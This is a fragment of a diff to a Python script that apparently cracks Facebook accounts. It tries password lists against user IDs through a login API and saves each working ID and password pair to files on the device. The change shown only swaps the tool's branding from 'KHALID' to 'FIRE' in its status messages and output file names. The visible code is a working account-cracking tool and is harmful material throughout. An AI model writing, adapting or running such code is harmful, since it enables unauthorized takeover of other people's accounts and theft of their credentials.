+                print(f'\r\r\033[1;32m [FIRE-OK] %s | %s'%(ids,pas))
+                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                 #cek_apk(session,coki)
                 oks.append(ids)
                 break
-            elif 'checkpoint' in Khalid:
+            elif 'checkpoint' in FIRE:
                 if 'y' in pcp:
-                    print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                     cps.append(ids)
                     break
                 else:
@@ -622,7 +624,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 def apix(ids,passlist):
         try:
             global ok,loop
-            sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
             for pas in passlist:
                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                 application_version_code=str(random.randint(000000000,999999999))
@@ -667,19 +669,19 @@ def apix(ids,passlist):
                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                 q = json.loads(po)
                 if 'session_key' in q:
-                    print(f'\r\r\033[1;32m [KHALID-OK] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-OK.txt','a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\033[1;32m [FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                     #cek_apk(session,coki)
                     oks.append(ids)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                     if 'y' in pcp:
-                        print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                        open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                        print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                        open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                         cps.append(ids)
                         break
                     else:
-                        open(f'/sdcard/KHALID-CP.txt','a').write(ids+'|'+pas+'\n')
+                        open(f'/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
                         break
                 else:
                     continue
